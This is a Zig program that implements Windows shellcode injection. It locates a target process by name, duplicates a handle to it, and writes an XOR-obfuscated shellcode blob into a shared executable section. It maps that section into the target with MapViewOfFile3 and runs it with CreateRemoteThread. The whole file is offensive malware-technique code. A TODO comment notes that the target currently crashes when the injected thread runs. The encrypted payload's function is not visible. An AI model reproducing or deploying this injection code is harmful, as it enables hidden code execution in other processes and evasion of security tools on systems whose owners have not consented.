const std = @import("std");
const win = @import("zigwin32").everything;

const HANDLE = win.HANDLE;
const PROCESSENTRY32 = win.PROCESSENTRY32;

const PROCESS_DUP_HANDLE = win.PROCESS_DUP_HANDLE;
const DUPLICATE_SAME_ACCESS = win.DUPLICATE_SAME_ACCESS;
const INVALID_HANDLE_VALUE = win.INVALID_HANDLE_VALUE;
const PAGE_EXECUTE_READWRITE = win.PAGE_EXECUTE_READWRITE;
const PAGE_EXECUTE_READ = win.PAGE_EXECUTE_READ;
const FILE_MAP_WRITE = win.FILE_MAP_WRITE;
const INFINITE = win.INFINITE;
const LPTHREAD_START_ROUTINE = win.LPTHREAD_START_ROUTINE;

const OpenProcess = win.OpenProcess;
const CreateToolhelp32Snapshot = win.CreateToolhelp32Snapshot;
const Process32First = win.Process32First;
const Process32Next = win.Process32Next;
const GetCurrentProcess = win.GetCurrentProcess;
const DuplicateHandle = win.DuplicateHandle;
const CreateFileMappingA = win.CreateFileMappingA;
const MapViewOfFile = win.MapViewOfFile;
const MapViewOfFile3 = win.MapViewOfFile3;
const UnmapViewOfFile = win.UnmapViewOfFile;
const CreateRemoteThread = win.CreateRemoteThread;
const WaitForSingleObject = win.WaitForSingleObject;
const ResumeThread = win.ResumeThread;
const CloseHandle = win.CloseHandle;
const GetLastError = win.GetLastError;

// XOR-encrypted shellcode with "hello" as the key.
var shellcode = [_:0]u8{ 148, 45, 239, 136, 159, 128, 165, 108, 108, 111, 41, 52, 45, 60, 61, 57, 51, 36, 93, 189, 13, 45, 231, 62, 15, 32, 238, 62, 116, 39, 227, 55, 76, 36, 228, 26, 53, 36, 99, 216, 34, 47, 33, 93, 166, 32, 84, 172, 192, 83, 9, 25, 110, 64, 79, 41, 164, 165, 97, 46, 105, 164, 142, 129, 61, 41, 52, 36, 231, 61, 72, 238, 46, 80, 39, 105, 181, 231, 236, 231, 104, 101, 108, 36, 234, 168, 17, 11, 36, 110, 184, 53, 231, 36, 119, 44, 238, 44, 76, 38, 105, 181, 143, 58, 39, 151, 172, 45, 231, 91, 224, 45, 109, 186, 34, 89, 172, 36, 93, 175, 196, 36, 173, 165, 98, 41, 100, 173, 84, 143, 29, 148, 32, 111, 35, 76, 109, 41, 85, 190, 29, 189, 52, 40, 228, 40, 65, 37, 109, 191, 14, 36, 231, 96, 39, 44, 238, 44, 112, 38, 105, 181, 45, 231, 107, 224, 45, 109, 188, 46, 48, 36, 52, 50, 54, 50, 36, 52, 45, 54, 41, 63, 36, 239, 131, 72, 36, 62, 147, 143, 48, 36, 53, 54, 39, 227, 119, 133, 59, 144, 151, 154, 49, 36, 213, 105, 101, 108, 108, 111, 104, 101, 108, 36, 226, 229, 100, 109, 108, 111, 41, 223, 93, 231, 0, 239, 154, 185, 215, 159, 221, 199, 58, 45, 213, 206, 240, 209, 241, 144, 189, 45, 239, 168, 71, 84, 99, 16, 102, 239, 147, 133, 25, 105, 212, 47, 118, 30, 3, 5, 104, 60, 45, 229, 181, 151, 176, 15, 13, 3, 11, 75, 9, 20, 10, 104 };

fn xorByInputKey(data: []u8, key: []const u8) void {
    for (0..data.len) |i| data[i] = data[i] ^ key[i % key.len];
}

fn getProcessIdByName(process_name: []const u8) !u32 {
    const h_snapshot = CreateToolhelp32Snapshot(.{ .SNAPPROCESS = 1 }, 0) orelse return error.CreateToolhelp32SnapshotFailed;
    defer _ = CloseHandle(h_snapshot);

    var proc: PROCESSENTRY32 = undefined;

    if (Process32First(h_snapshot, &proc) == 0) return error.Process32FirstFailed;

    while (Process32Next(h_snapshot, &proc) != 0) {
        if (std.ascii.eqlIgnoreCase(process_name, proc.szExeFile[0..process_name.len])) {
            return proc.th32ProcessID;
        }
    }

    return error.ProcessNotFound;
}

fn getAllAccessHandle(process_name: []const u8) !HANDLE {
    const pid = try getProcessIdByName(process_name);

    const current_process = GetCurrentProcess() orelse return error.GetCurrentProcessFailed;
    const target_process = OpenProcess(PROCESS_DUP_HANDLE, 0, pid) orelse return error.OpenProcessFailed;
    defer _ = CloseHandle(target_process);

    var duplicated_process: ?HANDLE = null;
    if (DuplicateHandle(
        target_process,
        current_process,
        current_process,
        &duplicated_process,
        0,
        0,
        DUPLICATE_SAME_ACCESS,
    ) == 0) return error.DuplicateHandleFailed;

    return duplicated_process orelse error.DuplicateHandleFailed;
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 2) return error.MissedTargetProcessName;
    const target_process_name = args[1];

    const target_process = try getAllAccessHandle(target_process_name);
    defer _ = CloseHandle(target_process);

    const h_file = CreateFileMappingA(
        INVALID_HANDLE_VALUE,
        null,
        PAGE_EXECUTE_READWRITE,
        0,
        shellcode.len,
        null,
    ) orelse return error.CreateFileMappingAFailed;
    defer _ = CloseHandle(h_file);

    const local_mapped_view: [*]u8 = @ptrCast(MapViewOfFile(
        h_file,
        FILE_MAP_WRITE,
        0,
        0,
        0,
    ) orelse return error.MapViewOfFileFailed);
    defer _ = UnmapViewOfFile(local_mapped_view);

    xorByInputKey(&shellcode, "hello");
    @memcpy(local_mapped_view, &shellcode);

    const remote_mapped_view: LPTHREAD_START_ROUTINE = @ptrCast(MapViewOfFile3(
        h_file,
        target_process,
        null,
        0,
        0,
        .{},
        @bitCast(PAGE_EXECUTE_READ),
        null,
        0,
    ) orelse return error.MapViewOfFile3Failed);
    defer _ = UnmapViewOfFile(remote_mapped_view);

    std.debug.print("remote mapped view: 0x{X}\n", .{@intFromPtr(remote_mapped_view)});

    // TODO: CreateRemoteThread successes but the target_process crashes with memory access violation error when the thread is executed.
    const h_thread = CreateRemoteThread(
        target_process,
        null,
        0,
        remote_mapped_view,
        null,
        0,
        null,
    ) orelse return error.CreateRemoteThreadFailed;
    defer _ = CloseHandle(h_thread);

    _ = WaitForSingleObject(h_thread, INFINITE);
}
